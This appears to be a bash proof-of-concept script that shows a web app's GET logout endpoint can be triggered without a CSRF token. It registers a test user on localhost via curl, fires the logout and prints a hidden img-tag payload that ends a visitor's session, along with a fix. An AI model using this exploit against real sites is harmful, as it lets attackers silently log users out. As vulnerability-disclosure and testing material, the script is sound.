#!/bin/bash

# CSRF Logout Vulnerability POC
# This script demonstrates that the logout endpoint is vulnerable to CSRF attacks
# via GET requests without CSRF token protection.

TARGET="http://localhost/accounts/logout/"
COOKIE_FILE="/tmp/csrf_logout_poc_cookies.txt"

echo "[*] CSRF Logout Vulnerability Proof of Concept"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Establish an authenticated session (simulating a logged-in user)
echo "[1] Establishing authenticated session..."
rm -f "$COOKIE_FILE"

RESPONSE=$(curl -c "$COOKIE_FILE" -s -i http://localhost/accounts/register/step1/ 2>&1)
CSRF=$(echo "$RESPONSE" | grep -oP 'name="csrfmiddlewaretoken" value="\K[^"]+')

# Register a test user
curl -b "$COOKIE_FILE" -c "$COOKIE_FILE" -s -X POST http://localhost/accounts/register/step1/ \
  -d "name=csrf_poc_user&password=password1234&csrfmiddlewaretoken=$CSRF" \
  -H "Referer: http://localhost/accounts/register/step1/" > /dev/null 2>&1

RESPONSE=$(curl -b "$COOKIE_FILE" -c "$COOKIE_FILE" -s -i http://localhost/accounts/register/step2/ 2>&1)
CSRF=$(echo "$RESPONSE" | grep -oP 'name="csrfmiddlewaretoken" value="\K[^"]+')
curl -b "$COOKIE_FILE" -c "$COOKIE_FILE" -s -X POST http://localhost/accounts/register/step2/ \
  -d "email=csrf_poc@test.com&csrfmiddlewaretoken=$CSRF" \
  -H "Referer: http://localhost/accounts/register/step2/" > /dev/null 2>&1

RESPONSE=$(curl -b "$COOKIE_FILE" -c "$COOKIE_FILE" -s -i http://localhost/accounts/register/step3/ 2>&1)
CSRF=$(echo "$RESPONSE" | grep -oP 'name="csrfmiddlewaretoken" value="\K[^"]+')
curl -b "$COOKIE_FILE" -c "$COOKIE_FILE" -s -X POST http://localhost/accounts/register/step3/ \
  -d "is_premium=on&csrfmiddlewaretoken=$CSRF" \
  -H "Referer: http://localhost/accounts/register/step3/" > /dev/null 2>&1

SESSION_ID=$(grep "sessionid" "$COOKIE_FILE" | grep -oP 'sessionid\t\K[^\r]+' | head -1)
echo "    Session ID: $SESSION_ID"
echo "    [+] Session established"
echo ""

# Step 2: Demonstrate CSRF vulnerability - no token needed
echo "[2] Triggering logout via GET request (CSRF Attack)..."
echo "    Command: curl -b '$COOKIE_FILE' -i '$TARGET'"
echo "    Note: NO CSRF token in URL or parameters"
echo ""

RESPONSE=$(curl -b "$COOKIE_FILE" -c "$COOKIE_FILE" -s -i "$TARGET" 2>&1)
STATUS=$(echo "$RESPONSE" | head -1)
echo "    Response: $STATUS"

# Extract Set-Cookie header to verify session was cleared
SESSION_COOKIE=$(echo "$RESPONSE" | grep -oP 'Set-Cookie: sessionid=\K[^;]+')
if [ -z "$SESSION_COOKIE" ] || [[ "$SESSION_COOKIE" == *"expires="* ]]; then
  echo "    [+] Session cookie cleared (logout successful)"
else
  echo "    [*] Session cookie: $SESSION_COOKIE"
fi
echo ""

# Step 3: Verify session is actually invalidated
echo "[3] Verifying session invalidation..."
RESPONSE=$(curl -b "sessionid=$SESSION_ID" -s -i http://localhost/accounts/ 2>&1)
VERIFY_STATUS=$(echo "$RESPONSE" | head -1 | grep -oP 'HTTP/1.1 \K[0-9]+')

if [ "$VERIFY_STATUS" != "200" ]; then
  echo "    [+] Old session rejected (HTTP $VERIFY_STATUS)"
  echo "    [+] Session properly invalidated"
else
  echo "    [!] Old session still works (HTTP $VERIFY_STATUS) - Potential issue"
fi
echo ""

# Step 4: Attack scenario
echo "[4] Attack Scenario:"
echo "    An attacker can embed this in a webpage:"
echo "    <img src='$TARGET' style='display:none;' />"
echo "    or"
echo "    <img src='$TARGET' />"
echo ""
echo "    When a logged-in user visits the attacker's page,"
echo "    their session will be silently terminated."
echo ""

echo "[+] CSRF VULNERABILITY CONFIRMED"
echo "    Severity: HIGH"
echo "    Root Cause: Logout implemented as HTTP GET without CSRF token"
echo "    Fix: Implement logout as POST with CSRF token requirement"

